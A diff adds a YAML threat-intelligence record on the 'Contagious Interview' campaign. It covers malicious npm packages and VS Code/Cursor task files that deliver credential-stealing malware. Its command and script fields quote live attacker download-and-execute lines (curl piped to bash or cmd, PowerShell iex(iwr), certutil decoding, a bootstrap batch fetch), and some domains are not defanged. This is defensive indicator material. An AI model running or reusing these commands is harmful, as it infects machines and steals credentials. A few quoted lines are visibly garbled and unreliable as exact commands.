@@ -1,0 +1,113 @@
+title: 'Contagious Interview: Evolution of VS Code and Cursor Tasks Infection Chains
+  - Part 1'
+description: A malicious npm package delivers a multi-stage payload that downloads
+  and executes obfuscated scripts, drops a batch file masquerading as a VS Code bootstrap,
+  and ultimately runs a Go-based infostealer with browser credential theft, keylogging,
+  and Discord token harvesting capabilities.
+attribution: Contagious Interview
+malware_families:
+- WeaselStore
+- Akira Stealer
+- ChainedDown
+- JADESNOW
+- wormhole
+- akirajutis
+cves: []
+ttps:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - node.exe
+  - pythonw.exe
+  - msiexec.exe
+  - certutil.exe
+  command_lines:
+  - curl -sL https://gist[.]githubusercontent[.]com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh
+    | bash
+  - iex(iwr 'https://gist[.]githubusercontent[.]com/cuda-toolkit/936835c7a98d3b223970a5d2ed63fc97/raw/cuda_toolkit_sim_v12.4.ps1'
+    -UseBasicParsing)
+  - curl https://nomgwenya[.]co[.]za/js/settings?win=32 | cmd
+  - if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process
+    -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden"
+    & exit /b
+  - certutil -f -decode "%~f0" "%TMP_JS%" >nul 2>&1
+  - msiexec /a
+  - curl -s -L -0 "%VSCODE_DIR%\vscode-bootstrap.cmd" "https://nomguenya.co.za/js/bootstrap?win=32"
+  - certutil f ~decode "s~f@" "KTHP_IS%" >nul 2581
+  powershell:
+  - iex(iwr 'https://gist[.]githubusercontent[.]com/cuda-toolkit/936835c7a98d3b223970a5d2ed63fc97/raw/cuda_toolkit_sim_v12.4.ps1'
+    -UseBasicParsing)
+  - powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList
+    '/c \"%~f0\" _restarted' -WindowStyle Hidden"
+  scripts:
+  - cuda_toolkit_sim_v12.4.ps1
+  - metal_pytorch_sim_v2.3.0.sh
+  - inject-simple.min0.js
+  - core.js
+  - googleDrive.js
+  - exec.py
+  - 'echo offset "VSCODE_DIR=*USERPROFILES\.vscode"
+
+    if not exist "%VSCODE_DIR%" mkdir "%VSCODE_DIR%"
+
+    curl -s -L -0 "%VSCODE_DIR%\vscode-bootstrap.cmd" "https://nomguenya.co.za/js/bootstrap?win=32"
+
+    cls
+
+    "%VSCODE_DIR%\vscode-bootstrap.cmd"
+
+    cls'
+  - import * as _mod_ from 'path';import * as _mod_1 from 'child_process';import *
+    as _mod_2 from 'fs';import * as _mod_3 from 'os';import * as _mod_4 from 'https';import
+    * as _mod_5 from 'zlib';import * as _mod_6 from 'url';
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - node.exe -> drive[.]google[.]com:443
+  - node.exe -> drive[.]usercontent[.]google[.]com:443
+  - pythonw.exe -> postprocesser[.]com:443
+  - curl -> nomguenya.co.za:443
+  file_activity:
+  - '%USERPROFILE%\.vscode\vscode-bootstrap.cmd'
+  - '%TEMP%\script_%RANDOM%.mjs'
+  - '%TEMP%\python3\exec.py'
+  - python3.zip
+  persistence:
+  - Malicious .vscode/tasks.json with runOn folderOpen trigger in VS Code and Cursor
+    repositories
+  - Batch script written to %USERPROFILE%\.vscode\vscode-bootstrap.cmd
+  - Batch file dropped to %USERPROFILE%\.vscode\vscode-bootstrap.cmd and executed
+  process_relations:
+  - cmd.exe -> powershell.exe -WindowStyle Hidden
+  - powershell.exe -> cmd.exe -WindowStyle Hidden
+  - node.exe -> pythonw.exe
+  - vscode-bootstrap.cmd -> node.exe
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - camdriver[.]pro
+  - gist[.]githubusercontent[.]com
+  - josehub88[.]vercel[.]app
+  - short[.]gy
+  - nomgwenya[.]co[.]za
+  - postprocesser[.]com
+  - drive[.]google[.]com
+  - drive[.]usercontent[.]google[.]com
+  - nomguenya[.]co[.]za
+  urls:
+  - hxxps://gist[.]githubusercontent[.]com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh
+  - hxxps://gist[.]githubusercontent[.]com/cuda-toolkit/936835c7a98d3b223970a5d2ed63fc97/raw/cuda_toolkit_sim_v12.4.ps1
+  - hxxps://camdriver[.]pro/realtekwin.update?r=7205d529-ff14-4dcf-965b-29d500663a75
+  - hxxps://camdriver[.]pro/realtekmac.sh?r=7205d529-ff14-4dcf-965b-29d500663a75
+  - hxxps://drive[.]google[.]com/file/d/16AaeeVhqj4Q6FlJIDMgdWASJvq7w00Yc/view?usp=sharing
+  - hxxps://drive[.]usercontent[.]google[.]com/download?id=${fileId}&export=download&confirm=t
+  - hxxps://nomgwenya[.]co[.]za/js/settings?win=32
+  - hxxps://nomgwenya[.]co[.]za/js/bootstrap?win=32
+  - hxxps://postprocesser[.]com/.well-known/pki-validation/go/python3.zip
+  - hxxps://nomguenya[.]co[.]za/js/bootstrap?win=32
+authors:
+- ASTRO team
+reference: https://www.abstract.security/blog/contagious-interview-evolution-of-vscode-and-cursor-tasks-infection-chains
+date_of_publication: May 22, 2026
+file_creation_date: May 22, 2026
